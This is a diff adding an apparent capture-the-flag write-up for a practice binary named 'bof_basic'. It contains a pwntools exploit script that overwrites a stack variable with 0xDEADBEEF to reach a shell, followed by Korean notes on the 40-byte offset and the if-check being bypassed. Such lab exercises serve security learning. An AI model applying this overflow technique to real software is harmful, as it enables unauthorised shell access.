@@ -1,0 +1,31 @@
+from pwn import*
+p = process('./bof_basic')
+
+pay = b'a'*40
+pay += p32(0xDEADBEEF)
+
+p.sendline(pay)
+p.interactive()
+____________________
+python Exploit Code
+____________________
+
+v5 = 0x4030201이라는 주소를 저장하고 있음
+
+fgets를 통해 s에 45자의 문자열을 입력받음
+
+printf를 통해 s에 입력된 문자열을 출력
+[buf]: 입력된 문자열
+
+printf를 통해 v5에 저장되어 있는 주소 출력 (4030201)
+만약 v5가 4030201 이 아니며 동시에 DEADBEEF가 아니면 
+puts를 통해 You are... way! 를 출력
+
+만약 v5 = DEADBEEF의 값을 가졌으면 
+Yeah dude ... shell... 을 출력 이후
+셸을 실행
+이후 Shell closed! Bye.를 출력
+
+원래 fgets가 45글자만을 입력받는 건데, 그것보다 더 많이 입력해야함
+v5와 s의 거리가 40byte니까, 40byte 거리이외의 메모리를 0xDEADBEEF로 채우면 됨
+0xDEADBEEF로 채우는 이유 : if조건문 뚫기 위해서
